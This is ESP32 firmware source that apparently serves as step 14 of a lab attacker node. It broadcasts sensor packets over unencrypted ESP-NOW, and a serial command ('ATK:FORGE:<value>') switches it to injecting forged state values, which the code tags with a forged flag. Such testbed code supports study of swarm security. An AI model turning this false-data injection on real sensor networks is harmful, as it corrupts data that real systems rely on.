
#include <ctype.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_err.h"
#include "esp_event.h"
#include "esp_now.h"
#include "esp_netif.h"
#include "esp_timer.h"
#include "esp_wifi.h"
#include "nvs_flash.h"
#include "esp_adc/adc_oneshot.h"
#include "protocol.h"

static const uint8_t broadcast_addr[ESP_NOW_ETH_ALEN] = {
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF
};

static uint8_t g_my_mac[ESP_NOW_ETH_ALEN];
static adc_oneshot_unit_handle_t adc_handle;
static portMUX_TYPE g_mode_mux = portMUX_INITIALIZER_UNLOCKED;
static bool g_forging = false;
static float g_forged_state = 0.9f;
static float g_state = 0.0f;

static float read_sensor(void)
{
    int sum = 0;

    for (int i = 0; i < 16; i++) {
        int raw = 0;
        ESP_ERROR_CHECK(adc_oneshot_read(
            adc_handle, ADC_CHANNEL_6, &raw));
        sum += raw;
    }

    return (sum / 16.0f) / 4095.0f;
}

static void init_adc(void)
{
    adc_oneshot_unit_init_cfg_t unit_cfg = {
        .unit_id = ADC_UNIT_1
    };
    ESP_ERROR_CHECK(adc_oneshot_new_unit(&unit_cfg, &adc_handle));

    adc_oneshot_chan_cfg_t chan_cfg = {
        .bitwidth = ADC_BITWIDTH_12,
        .atten = ADC_ATTEN_DB_12
    };
    ESP_ERROR_CHECK(adc_oneshot_config_channel(
        adc_handle, ADC_CHANNEL_6, &chan_cfg));
}

static void wifi_espnow_init(void)
{
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_ERROR_CHECK(esp_wifi_set_channel(
        SWARM_CHANNEL, WIFI_SECOND_CHAN_NONE));
    ESP_ERROR_CHECK(esp_wifi_get_mac(WIFI_IF_STA, g_my_mac));

    ESP_ERROR_CHECK(esp_now_init());

    esp_now_peer_info_t peer = {0};
    memcpy(peer.peer_addr, broadcast_addr, sizeof(broadcast_addr));
    peer.channel = SWARM_CHANNEL;
    peer.ifidx = WIFI_IF_STA;
    peer.encrypt = false;
    ESP_ERROR_CHECK(esp_now_add_peer(&peer));
}

static void sender_task(void *arg)
{
    (void)arg;

    swarm_pkt_t pkt = {0};
    pkt.magic = PKT_MAGIC;
    memcpy(pkt.src_id, g_my_mac, sizeof(g_my_mac));

    for (;;) {
        float sensor = read_sensor();
        bool forging;
        float forged_state;

        portENTER_CRITICAL(&g_mode_mux);
        forging = g_forging;
        forged_state = g_forged_state;
        portEXIT_CRITICAL(&g_mode_mux);

        if (forging) {
            pkt.state = forged_state;
            pkt.sensor = forged_state;
            pkt.flags = FLAG_FORGED;
        } else {
            g_state = sensor;
            pkt.state = g_state;
            pkt.sensor = sensor;
            pkt.flags = FLAG_HONEST;
        }

        pkt.t_us = esp_timer_get_time();

        esp_err_t err = esp_now_send(
            broadcast_addr, (const uint8_t *)&pkt, sizeof(pkt));

        if (err != ESP_OK) {
    printf("Send failed: %s\n", esp_err_to_name(err));
}

        pkt.seq++;
        vTaskDelay(pdMS_TO_TICKS(BCAST_PERIOD_MS));
    }
}

static void command_task(void *arg)
{
    (void)arg;
    char line[64];

    printf("Commands: ATK:FORGE:0.9 | ATK:STOP\n");

    for (;;) {
        if (fgets(line, sizeof(line), stdin) == NULL) {
            vTaskDelay(pdMS_TO_TICKS(100));
            continue;
        }

        line[strcspn(line, "\r\n")] = '\0';

        if (strcmp(line, "ATK:STOP") == 0) {
            portENTER_CRITICAL(&g_mode_mux);
            g_forging = false;
            portEXIT_CRITICAL(&g_mode_mux);
            printf("FORGE stopped; normal sensor broadcasts resumed\n");
            continue;
        }

        const char prefix[] = "ATK:FORGE:";
        if (strncmp(line, prefix, sizeof(prefix) - 1) == 0) {
            char *value_text = line + sizeof(prefix) - 1;
            char *end = NULL;
            float value = strtof(value_text, &end);

            while (end != NULL && isspace((unsigned char)*end)) {
                end++;
            }

            if (end == value_text || end == NULL || *end != '\0' ||
                value < 0.0f || value > 1.0f) {
                printf("Usage: ATK:FORGE:<value 0..1>\n");
                continue;
            }

            portENTER_CRITICAL(&g_mode_mux);
            g_forged_state = value;
            g_forging = true;
            portEXIT_CRITICAL(&g_mode_mux);

            printf("FORGE active: %.3f\n", (double)value);
            continue;
        }

        printf("Unknown command. Use ATK:FORGE:0.9 or ATK:STOP\n");
    }
}

void app_main(void)
{
    ESP_ERROR_CHECK(nvs_flash_init());
    init_adc();
    wifi_espnow_init();

    printf("Attacker Step 14 ready; MAC %02X:%02X:%02X:%02X:%02X:%02X\n",
           g_my_mac[0], g_my_mac[1], g_my_mac[2],
           g_my_mac[3], g_my_mac[4], g_my_mac[5]);

    xTaskCreate(sender_task, "atk_sender", 3072, NULL, 5, NULL);
    xTaskCreate(command_task, "atk_console", 3072, NULL, 5, NULL);
}
